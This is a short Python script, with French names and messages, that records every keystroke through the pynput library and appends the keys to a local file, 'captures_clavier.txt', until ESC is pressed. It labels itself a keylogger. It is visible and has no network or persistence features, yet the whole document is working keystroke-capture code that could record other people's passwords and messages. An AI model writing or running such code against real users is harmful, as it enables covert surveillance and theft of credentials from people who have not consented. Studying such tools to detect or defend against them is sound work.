from pynput import keyboard


fichier_log = "captures_clavier.txt"


def touche_pressee(touche):
    try:
        with open(fichier_log, "a") as f:
            f.write(f"{touche.char}")
    except AttributeError:
        with open(fichier_log, "a") as f:
            if touche == keyboard.Key.space:
                f.write(" ")
            elif touche == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{touche}] ")


def touche_relachee(touche):
    if touche == keyboard.Key.esc:
        return False


print("Keylogger demarre. Appuyez sur ESC pour arreter.")

with keyboard.Listener(on_press=touche_pressee, on_release=touche_relachee) as listener:
    listener.join()

print("Keylogger arrete.")
